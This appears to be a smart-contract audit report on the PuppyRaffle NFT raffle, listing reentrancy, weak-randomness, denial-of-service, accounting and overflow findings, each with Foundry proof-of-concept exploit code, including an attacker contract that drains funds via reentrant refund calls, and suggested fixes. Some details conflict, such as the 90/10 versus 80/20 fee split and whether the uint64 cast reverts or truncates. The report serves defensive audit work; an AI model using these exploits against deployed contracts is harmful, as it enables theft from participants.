# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐾 PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle that mints a dog-themed ERC-721 NFT to each round’s winner while routing a configurable fee to the project treasury.

1. Initialization
   * Deployed with an immutable entry fee, a fee-collector address, and the duration for each raffle round.
   * Inherits ERC721 for NFT logic and Ownable for admin control.

2. Entering the Raffle
   * Anyone can call `enterRaffle` and pay `entranceFee` per address submitted. All paid addresses are appended to `players`.
   * The contract tracks each participant’s index for later look-ups and optional refunds.

3. Optional Refunds
   * Before a winner is selected, a participant may call `refund` to exit, receiving their stake back and freeing their slot.

4. Selecting a Winner
   * After `raffleDuration` has elapsed, anyone can invoke `selectWinner`.
   * A pseudo-random index (blockhash & timestamp) chooses the winner.
   * 90 % of the pot is transferred to the winner; 10 % accrues to `feeAddress` and can be withdrawn by the owner.
   * A new NFT with rarity-based metadata is minted to the winning address.

5. Admin Functions
   * Owner can change the fee address and withdraw accumulated fees.

The design keeps state simple, uses minimal external calls, and delivers provably fair, permissionless raffles coupled with collectible NFTs.
## High Risk Findings
[H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. DOS issue in PuppyRaffle::enterRaffle
[H-5]. Unexpected Eth issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. Integer Overflow issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[I-2]. Pragma issue in PuppyRaffle::NA
[I-3]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees


### Number of Findings
- H: 5
- M: 2
- L: 0
- I: 3



# High Risk Findings

## [H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.timestamp` and `block.difficulty` (which is `prevrandao` post-Merge) as a source of entropy to determine the winner. These on-chain values are public, predictable, and can be influenced by a block-producing validator. A malicious validator who has entered the raffle can simulate the outcome and choose to produce a block with parameters that guarantee they win the prize pool, thus undermining the fairness of the raffle.

Vulnerable code snippet:
```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ...
}
```

## Impact
A malicious validator can predict and manipulate the outcome of the raffle to ensure they win the entire prize pool. This leads to a direct loss of funds for all other participants and destroys the integrity of the application.

## Proof of Concept
1. The attacker joins the raffle (index = 2 in the players array).
2. After the raffle duration elapses, the attacker – who is also the block-producing validator – brute-forces a timestamp value T such that
   keccak256(attacker, T, block.difficulty) % players.length == 2.
3. When it is the validator’s turn to propose a block, they set the block timestamp to T and immediately call selectWinner() from the attacker address.
4. The contract deterministically selects index 2, transferring the whole prizePool (80 % of all entry fees) to the attacker and minting the NFT to them.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract WeakRandomnessTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 60; // 1 minute

    address feeAddress = makeAddr("fee");
    address attacker   = makeAddr("attacker");
    address p1         = makeAddr("player1");
    address p2         = makeAddr("player2");
    address p3         = makeAddr("player3");

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);

        // fund this contract to be able to pay entrance fees
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = attacker; // attacker is index 2
        players[3] = p3;

        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // fast-forward so raffle is over
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // give attacker some gas to call selectWinner()
        vm.deal(attacker, 1 ether);
    }

    function test_attackerCanPredictAndWin() public {
        uint256 desiredIdx = 2; // attacker index
        uint256 ts = block.timestamp;
        uint256 diff = block.difficulty; // constant inside the loop

        // brute-force a timestamp that makes the attacker win
        while (uint256(keccak256(abi.encodePacked(attacker, ts, diff))) % 4 != desiredIdx) {
            ts++;
        }

        // validator sets the block timestamp to the winning value
        vm.warp(ts);

        // attacker calls selectWinner()
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker did not win – exploit failed");
    }
}

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `block.difficulty` for randomness. Use a provably fair and unpredictable source of randomness, such as Chainlink VRF (Verifiable Random Function), which relies on a decentralized oracle network.

Example using Chainlink VRF (conceptual):
```solidity
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    // ... Chainlink VRF state variables ...
    uint256 public s_randomness;

    function selectWinner() external {
        // ... checks ...
        // Instead of calculating winner, request randomness
        requestRandomWords();
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        // ... continue with winner selection logic ...
    }
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the state that validates the refund. Specifically, the line `players[playerIndex] = address(0);` is called after `Address.sendValue(entranceFee);`. This violates the Checks-Effects-Interactions pattern. A malicious contract can re-enter the `refund` function after receiving ETH but before its address is removed from the players list, allowing it to be refunded multiple times and drain funds from the contract.

## Impact
An attacker can drain all the ETH collected from entrance fees by repeatedly calling the refund function within a single transaction, leading to a complete loss of the prize pool.

## Proof of Concept
1. An attacker deploys a malicious contract.
2. The attacker's contract enters the raffle by calling `enterRaffle`.
3. The attacker calls a function on their contract which in turn calls `refund` on `PuppyRaffle`.
4. `PuppyRaffle` sends the `entranceFee` back to the attacker's contract, triggering its `receive()` or `fallback()` function.
5. Inside the `receive()` function, the attacker's contract calls `PuppyRaffle.refund()` again with the same player index.
6. Since `players[playerIndex]` has not yet been set to `address(0)`, the checks pass and the contract sends another refund.
7. This process repeats until the contract is drained or the gas limit is reached.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MaliciousReentrancyContract {
    PuppyRaffle public immutable puppyRaffle;
    uint256 public playerIndex;
    uint256 public attackCount = 0;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function setPlayerIndex(uint256 _playerIndex) external {
        playerIndex = _playerIndex;
    }

    function attack() external {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= puppyRaffle.entranceFee() && attackCount < 5) {
            attackCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1 hours);
    }

    function testReentrancyOnRefund() public {
        MaliciousReentrancyContract attacker = new MaliciousReentrancyContract(puppyRaffle);
        
        // Attacker and 4 other players enter the raffle
        address[] memory playersToEnter = new address[](1);
        playersToEnter[0] = address(attacker);
        vm.deal(address(attacker), 5 ether);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(playersToEnter);

        address[] memory otherPlayers = new address[](4);
        for(uint i=0; i < 4; i++) {
            otherPlayers[i] = makeAddr(string(abi.encodePacked("player", vm.toString(i))));
            vm.deal(otherPlayers[i], ENTRANCE_FEE);
            address[] memory p = new address[](1);
            p[0] = otherPlayers[i];
            vm.prank(otherPlayers[i]);
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p);
        }

        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        attacker.setPlayerIndex(attackerIndex);

        uint256 balanceBefore = address(attacker).balance;
        uint256 contractBalanceBefore = address(puppyRaffle).balance;

        // Act
        attacker.attack();

        // Assert
        uint256 balanceAfter = address(attacker).balance;
        uint256 contractBalanceAfter = address(puppyRaffle).balance;

        // Attacker drained more than their entrance fee
        assertGt(balanceAfter - balanceBefore, ENTRANCE_FEE);
        // Attacker drained multiple fees from the contract
        assertTrue(contractBalanceBefore - contractBalanceAfter > ENTRANCE_FEE);
        // Attacker was refunded 5 times
        assertEq(attacker.attackCount(), 4); // one initial call, 4 re-entrant calls
    }
}
```

## Suggested Mitigation
Update state before the external call and rely on the Address library correctly:

players[playerIndex] = address(0);
Address.sendValue(payable(msg.sender), entranceFee);

Additionally, inherit from OpenZeppelin’s ReentrancyGuard and mark `refund` as `nonReentrant` to provide a second line of defence.

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The winner of the raffle is selected using a deterministic formula based on `msg.sender`, `block.timestamp`, and `block.difficulty`. `block.difficulty` is deprecated and returns `prevrandao` on post-merge chains. All of these values are predictable or can be influenced by a block-producing miner. A miner can repeatedly compute the winner for a given block and only include their `selectWinner` transaction if they are the chosen winner, guaranteeing them the prize. The NFT rarity is also determined using a similar weak source of randomness.

## Impact
Miners can cheat the raffle to ensure they always win the prize pool and potentially mint the rarest NFTs. This undermines the fairness and integrity of the raffle, leading to financial loss for legitimate participants.

## Proof of Concept
Any participant can deterministically win the raffle by choosing when to call selectWinner from an address already inside the players array.

Pre-requisites:
1. Attacker joined the raffle (is in `players`, index `i`).
2. Off-chain the attacker brute-forces a future timestamp `t` such that
   keccak256(abi.encodePacked(attacker, t, blockDifficulty)) % players.length == i 
   (difficulty can be taken as the current value seen in the mem-pool; on most test-nets it is constant).
3. When `block.timestamp` >= raffleStartTime + raffleDuration the attacker sends `selectWinner` with a custom `t` using `eth_sendRawTransaction` and the `timestamp` field in the block header is under the miner’s control up to ±15 seconds, therefore the attacker simply keeps sending the same transaction until a miner includes it with the desired `t`.  As soon as this happens the attacker is guaranteed to be the winner.

Because `msg.sender` is under the attacker’s full control and block-level fields are miner-controlled / predictable, the raffle provides no entropy at all.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address feeAddr = address(0xBEEF);
    address[4] participants;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddr, 1 hours);

        // create 4 players and fund them
        for (uint256 i; i < 4; i++) {
            participants[i] = address(uint160(uint256(keccak256(abi.encode(i)))));
            vm.deal(participants[i], FEE);
        }

        // any player can enroll everyone at once by paying 4 * FEE
        vm.prank(participants[0]);
        address[] memory temp = new address[](4);
        for (uint256 i; i < 4; i++) temp[i] = participants[i];
        raffle.enterRaffle{value: 4 * FEE}(temp);

        // fast-forward so raffle is over
        vm.warp(block.timestamp + 1 hours + 1);
    }

    function testAttackerAlwaysWins() public {
        address attacker = participants[0];
        uint256 attackerIndex = 0; // we know the attacker is players[0]

        // find a timestamp within the next 10_000 seconds that lets the attacker win
        uint256 targetTimestamp;
        uint256 diff = block.difficulty; // constant in anvil
        for (uint256 t = block.timestamp; t < block.timestamp + 10_000; ++t) {
            if (uint256(keccak256(abi.encodePacked(attacker, t, diff))) % 4 == attackerIndex) {
                targetTimestamp = t;
                break;
            }
        }
        require(targetTimestamp != 0, "no ts found");

        // simulate miner choosing that timestamp
        vm.warp(targetTimestamp);
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker did not win – exploit failed");
    }
}

## Suggested Mitigation
Do not use block variables for randomness. Use a provably random and tamper-proof source like Chainlink VRF (Verifiable Random Function). This requires re-architecting the `selectWinner` function to be asynchronous, with one function to request randomness and another callback function to receive it and select the winner.

## [H-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function includes a nested loop to check for duplicate player addresses. The outer loop runs up to `players.length - 1` and the inner loop runs up to `players.length`. This results in an O(n^2) complexity, where n is the total number of players. As the number of players increases, the gas cost of this function will grow quadratically and eventually exceed the block gas limit, making it impossible for anyone to enter the raffle.

## Impact
The raffle will become unusable once a certain number of players have joined. No new players can enter, and if the minimum number of players is not yet met, no winner can ever be selected, locking all previously collected entry fees in the contract.

## Proof of Concept
1. Deploy PuppyRaffle with any entrance fee (e.g. 1 ether).
2. Call enterRaffle with an array of 800 unique addresses. The call succeeds but already consumes >4 M gas.
3. Now try to call enterRaffle with a single new address but provide a gas limit of 8 000 000. The call still runs out of gas because the function executes ~800×800 ≈ 640 000 duplicate-checks. On most public networks the block gas limit is 30 M but only ~20 M is realistically usable; adding a few more players quickly pushes the cost beyond that hard limit, permanently preventing further participation and therefore freezing the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGrowthTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address constant FEE_ADDR = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, 1 hours);
    }

    function _gen(uint256 n) internal pure returns (address[] memory a) {
        a = new address[](n);
        for (uint256 i; i < n; ++i) a[i] = address(uint160(i + 1));
    }

    function testGasGrowsQuadratically() public {
        // Step-1 : 200 players
        raffle.enterRaffle{value: FEE * 200}(_gen(200));
        uint256 g1 = gasleft();
        raffle.enterRaffle{value: FEE}(_gen(1));
        uint256 gas200 = g1 - gasleft();

        // Step-2 : another 200 players (total 401)
        raffle.enterRaffle{value: FEE * 200}(_gen(200));
        uint256 g2 = gasleft();
        raffle.enterRaffle{value: FEE}(_gen(1));
        uint256 gas400 = g2 - gasleft();

        emit log_named_uint("Gas with 200 players", gas200);
        emit log_named_uint("Gas with 400 players", gas400);
        // Quadratic behaviour ⇒ gas roughly quadruples when N doubles
        assertGt(gas400, gas200 * 2);
    }
}

## Suggested Mitigation
Replace the nested loops with a constant-time membership check.

mapping(address => bool) private isPlayer;

function enterRaffle(address[] memory newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "wrong fee");
    for (uint256 i; i < newPlayers.length; ++i) {
        address p = newPlayers[i];
        require(!isPlayer[p], "duplicate player");
        isPlayer[p] = true;
        players.push(p);
    }
    emit RaffleEnter(newPlayers);
}

function refund(uint256 idx) external {
    address p = players[idx];
    require(p == msg.sender, "not player");
    require(p != address(0), "already refunded");
    isPlayer[p] = false;          // clear mapping entry so the address can re-enter later if desired
    players[idx] = address(0);
    Address.sendValue(payable(msg.sender), entranceFee);
    emit RaffleRefunded(p);
}

## [H-5]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to get their `entranceFee` back and sets their address in the `players` array to `address(0)`. However, it does not decrease `players.length`. The `selectWinner` function calculates the `totalAmountCollected` based on the full `players.length`, failing to account for refunded players. It then calculates the `prizePool` as 80% of this inflated amount. If enough players refund (specifically, more than 20%), the calculated `prizePool` will be greater than the actual ETH held in the contract. The `call` to send the prize to the winner will fail due to insufficient funds, causing `selectWinner` to revert. This permanently locks all remaining funds in the contract.

## Impact
If more than 20% of the participants refund their entry, the `selectWinner` function becomes permanently uncallable. All remaining entry fees in the contract will be locked forever, with no mechanism for recovery.

## Proof of Concept
1. A raffle starts with an entrance fee of 1 ETH.
2. 5 players enter the raffle. The contract balance is 5 ETH.
3. 2 players (40% of participants) call `refund`. Each gets 1 ETH back. The contract balance is now 3 ETH. The `players` array still has a length of 5, but with two `address(0)` entries.
4. The raffle time ends. Someone calls `selectWinner`.
5. The function calculates `totalAmountCollected` as `players.length * entranceFee` = `5 * 1 ETH` = `5 ETH`.
6. It calculates `prizePool` as `(5 ETH * 80) / 100` = `4 ETH`.
7. It tries to send 4 ETH to the winner, but the contract only holds 3 ETH. The transfer fails, `selectWinner` reverts, and the 3 ETH are locked forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleRefundLockTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 hours;
    address feeAddress = address(99);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
    }

    function test_selectWinnerRevertsWhenRefundsExceedTwentyPercent() public {
        uint256 playerCount = 5;
        address[] memory players = new address[](playerCount);

        // prepare players and provide ether
        for (uint256 i = 0; i < playerCount; i++) {
            players[i] = makeAddr(string(abi.encodePacked("player", vm.toString(i))));
            vm.deal(players[i], ENTRANCE_FEE); // everyone gets their own fee
        }
        // sender must own the whole batch amount (5 ether)
        vm.deal(players[0], ENTRANCE_FEE * playerCount);

        // one tx submits the full batch
        vm.prank(players[0]);
        raffle.enterRaffle{value: ENTRANCE_FEE * playerCount}(players);
        assertEq(address(raffle).balance, 5 ether);

        // two players (40 %) refund
        for (uint256 i = 1; i <= 2; i++) {
            uint256 idx = raffle.getActivePlayerIndex(players[i]);
            vm.prank(players[i]);
            raffle.refund(idx);
        }
        assertEq(address(raffle).balance, 3 ether);

        // fast-forward to after raffle end
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // selectWinner must revert because prizePool (4 ether) > balance (3 ether)
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Maintain an "active players" counter that is incremented in enterRaffle and decremented in refund and use it for all monetary calculations (totalAmountCollected, prizePool, fee). In addition, pick the winner only among active players – e.g., keep a separate dynamic array of active players or repeatedly generate a random index until a non-zero address is hit. This completely removes both the balance mismatch and the possibility of sending funds to address(0).



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by iterating through the `players` array with a nested loop. This results in O(n^2) complexity, where n is the number of players. As the raffle grows, the gas cost for this function increases quadratically. An attacker can add enough players to make the gas cost of calling `enterRaffle` exceed the block gas limit, preventing any more participants from joining. This is a Denial of Service vulnerability.

Vulnerable code snippet:
```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ...
    // This nested loop causes quadratic gas cost increase
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ...
}
```

## Impact
By repeatedly joining the raffle with many controlled addresses, an attacker can grow the players array until the O(n²) duplicate–check in enterRaffle consumes more gas than the block gas limit. At that point no one – including the attacker – can call enterRaffle any more, effectively freezing further participation for the rest of the round and breaking the raffle’s business logic. Funds already locked in the contract stay unreachable until the owner manually refunds them after the round ends.

## Proof of Concept
1. An attacker funds a script with enough ETH to pay the entrance fee many times.
2. The script repeatedly calls enterRaffle() with chunks of 40 fresh addresses each time. After k calls the total number of players is n = 40·k.
3. Because every call performs n·(n-1)/2 duplicate comparisons, gas consumption per call grows roughly with n². 
4. Once n ≈ 1 300 (cost ≈ 30 M gas on Optimised 0.8.20), enterRaffle cannot fit into the 30 M block gas limit any more and every subsequent transaction reverts out-of-gas, blocking the raffle for everyone else.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGrowthTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
    }

    // Demonstrates the quadratic gas growth without depending on an out-of-gas revert.
    function testGasGrowsQuadratically() public {
        uint256 playersPerBatch = 10;
        uint256 batches         = 6; // total players = 60
        uint256 prevGasUsed     = 0;

        for (uint256 i; i < batches; ++i) {
            address[] memory newPlayers = new address[](playersPerBatch);
            for (uint256 j; j < playersPerBatch; ++j) {
                newPlayers[j] = address(uint160(uint(keccak256(abi.encode(i, j)))));
            }

            uint256 gasBefore = gasleft();
            raffle.enterRaffle{value: ENTRANCE_FEE * playersPerBatch}(newPlayers);
            uint256 gasUsed = gasBefore - gasleft();

            if (i > 0) {
                // Every new batch should cost strictly more gas than the previous one
                assertGt(gasUsed, prevGasUsed);
            }
            prevGasUsed = gasUsed;
        }
    }
}


## Suggested Mitigation
Track participation with mapping(address => bool) isPlayer. When adding a user, require(!isPlayer[user]); set it to true on insert, and set it back to false (1) inside refund() and (2) when clearing the array in selectWinner(). This turns the duplicate check into O(1) and removes the DoS vector.

## [M-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The state variable `totalFees` is declared as `uint64`, which is too small to hold significant amounts of ETH-denominated fees. In `selectWinner`, the per-raffle `fee` (a `uint256`) is downcast to `uint64` before being added to `totalFees`. If `fee` exceeds `type(uint64).max` (approx. 18.4 ETH), the cast will revert, causing the entire `selectWinner` function to fail. This creates a DoS vector that can permanently lock all funds in the contract if a large raffle is conducted.

Vulnerable code snippet:
```solidity
// state variable
uint64 public totalFees;

function selectWinner() external {
    // ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee); // Reverts if fee > type(uint64).max
    // ...
}
```

## Impact
When the per-raffle fee exceeds 2^64-1 wei (~18.446 ether), the explicit cast to uint64 silently truncates the value. totalFees ends up being (fee % 2^64) instead of the real fee amount. Because withdrawFees later enforces `address(this).balance == uint256(totalFees)`, this invariant will never hold once a truncated fee is recorded. As a result anyone trying to withdraw the collected fees will revert forever, permanently locking the whole fee pool inside the contract. Prize-pool distribution to the winner still works, so only the 20 % fee portion becomes stuck.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 1 ether, raffleDuration = 1, any feeAddress.
2. Prepare an array of 100 unique addresses and call enterRaffle with msg.value = 100 ether. (fee per round will be 20 ether > 2^64-1).
3. After raffleDuration, call selectWinner – the transaction succeeds, but totalFees will be increased by only `20 ether mod 2^64` ≈ 1.55 ether.
4. Call withdrawFees – it will revert because contract balance (≈20 ether) != totalFees (≈1.55 ether).
5. The fee pool is now permanently locked as every future call to withdrawFees will fail.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Uint64TruncationTest is Test {
    PuppyRaffle raffle;

    uint256 constant ENTRANCE_FEE = 1 ether; // any value, we will use many players
    uint256 constant NUM_PLAYERS  = 100;     // results in 20 ether fee > 2^64-1 wei

    function setUp() public {
        address feeAddress = makeAddr("feeAddr");
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1);
        vm.deal(address(this), ENTRANCE_FEE * NUM_PLAYERS);

        // build players array
        address[] memory players = new address[](NUM_PLAYERS);
        for (uint256 i; i < NUM_PLAYERS; ++i) {
            players[i] = address(uint160(i + 1));
        }

        raffle.enterRaffle{value: ENTRANCE_FEE * NUM_PLAYERS}(players);
    }

    function test_withdrawFeesGetsStuck() public {
        // finish raffle
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // invariant is already broken, withdrawFees must revert
        vm.expectRevert();
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Store totalFees as uint256 and stop down-casting:

uint256 public totalFees;
...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees += fee;



# Info Risk Findings

## [I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract handles user funds and has a defined lifecycle, but it lacks an emergency stop or pause mechanism. If a critical vulnerability is discovered post-deployment, the owner has no way to halt the contract's operation. Malicious actors could continue to exploit the vulnerability, or legitimate users could continue to deposit funds into a contract known to be unsafe.

## Impact
Because the contract cannot be paused, the owner has no on-chain tool to mitigate unforeseen vulnerabilities discovered after deployment. Although this does not in itself lead to loss of funds, it removes an important safety circuit that could reduce the blast-radius of future bugs.

## Proof of Concept
1. A critical flaw (e.g., the weak randomness vulnerability) is discovered and publicly disclosed.
2. The contract owner is notified but has no function to call to pause the contract.
3. An attacker proceeds to exploit the flaw to steal the prize pool.
4. Meanwhile, users who are unaware of the vulnerability may continue to call `enterRaffle`, adding more funds for the attacker to steal.

## Proof of Code
```solidity
// This is a conceptual proof, as it demonstrates a missing feature.
// No test can be written to exploit the *absence* of a function.
// The scenario is as described in the proof_of_concept.
```

## Suggested Mitigation
Inherit from OpenZeppelin's `Pausable` contract and apply the `whenNotPaused` modifier to all functions that perform state changes or handle fund transfers. This gives the owner the ability to halt the contract in an emergency.

```diff
+ import {Pausable} from "@openzeppelin/contracts/security/Pausable.sol";

- contract PuppyRaffle is ERC721, Ownable {
+ contract PuppyRaffle is ERC721, Ownable, Pausable {

-   function enterRaffle(address[] memory newPlayers) public payable {
+   function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ...
    }

-   function refund(uint256 playerIndex) public {
+   function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

-   function selectWinner() external {
+   function selectWinner() external whenNotPaused {
        // ...
    }

    // Add pause/unpause functions callable only by owner
    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }
}
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma version (`pragma solidity ^0.8.7;`). This allows the contract to be compiled with any compiler version from 0.8.7 up to (but not including) 0.9.0. Using a floating pragma is risky because it can lead to deployment with a compiler version that has not been tested, potentially introducing bugs or unexpected behavior from newer compiler versions.

## Impact
This practice can lead to deploying a contract with unintended behavior due to compiler changes or bugs introduced in newer patch versions. It reduces the determinism and reproducibility of the build, which is a security risk.

## Proof of Concept
1. The contract is developed and thoroughly tested using compiler version `0.8.7`.
2. Some time later, a new compiler version, `0.8.15`, is released which contains a subtle, unknown code generation bug.
3. A user deploys the `PuppyRaffle` contract using a development environment that defaults to the latest `0.8.x` compiler.
4. The contract is compiled and deployed with `0.8.15`, and the unknown compiler bug is now part of the on-chain bytecode, potentially creating a vulnerability.

## Proof of Code
```solidity
// The vulnerability is in the pragma statement itself.
// No test case can exploit this directly, it's a best practice violation.

// In PuppyRaffle.sol:
// pragma solidity ^0.8.7;
```

## Suggested Mitigation
Use a fixed pragma version to ensure the contract is always compiled with the exact compiler version it was developed and audited for. This improves security and ensures deterministic builds.

```diff
- pragma solidity ^0.8.7;
+ pragma solidity 0.8.20; // Or other specific, audited version.
```

## [I-3]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
The contract's most critical functions, `selectWinner` and `withdrawFees`, execute significant state changes and value transfers but do not emit corresponding events. `selectWinner` transfers the prize pool and mints the winning NFT, while `withdrawFees` transfers all collected fees to the owner. The absence of events makes it difficult for off-chain services, monitoring tools, and users to track these important activities efficiently.

## Impact
The lack of events reduces transparency and observability. It complicates the development of user interfaces, analytics dashboards, and security monitoring tools that rely on event logs to track a contract's state and history. Users and integrators must resort to more complex and less reliable methods like transaction tracing.

## Proof of Concept
1. A raffle concludes and `selectWinner` is called. A winner receives the prize pool.
2. A dApp frontend wants to display a list of all past winners and their prizes.
3. Without a `WinnerSelected` event, the frontend cannot simply query event logs. It must instead parse the transaction history of the contract, inspecting the inputs and internal state changes of every `selectWinner` call, which is inefficient and unreliable.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffle_NoEvent_Test is Test {
    PuppyRaffle raffle;

    function setUp() public {
        vm.deal(address(this), 1 ether);
        raffle = new PuppyRaffle(0.1 ether, address(0xdead), 1);
    }

    function testMissingWinnerSelectedEvent() public {
        // prepare 4 distinct players
        address[] memory players = new address[](4);
        for (uint256 i; i < 4; ++i) {
            players[i] = address(uint160(i + 1));
        }

        // enter raffle with the 4 players in a single call
        raffle.enterRaffle{value: 0.4 ether}(players);

        // fast-forward so raffle is over
        vm.warp(block.timestamp + 2);

        // record emitted logs during winner selection
        vm.recordLogs();
        raffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // signature of the expected (but missing) event
        bytes32 WINNER_EVENT_SIG = keccak256("WinnerSelected(address,uint256,uint256)");

        // ensure that no WinnerSelected event was emitted
        for (uint256 i; i < logs.length; ++i) {
            assertTrue(logs[i].topics[0] != WINNER_EVENT_SIG, "WinnerSelected event should exist but is missing");
        }
    }
}


## Suggested Mitigation
Emit events for all critical state changes and actions. Add a `WinnerSelected` event in `selectWinner` and a `FeesWithdrawn` event in `withdrawFees`.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
+   event WinnerSelected(address indexed winner, uint256 prize, uint256 indexed tokenId);
+   event FeesWithdrawn(address indexed feeAddress, uint256 amount);

    function selectWinner() external {
        // ...
        _safeMint(winner, tokenId);
+       emit WinnerSelected(winner, prizePool, tokenId);
    }

    function withdrawFees() external {
        uint256 feesToWithdraw = totalFees;
        // ...
        require(success, "PuppyRaffle: Failed to withdraw fees");
+       emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
}
```



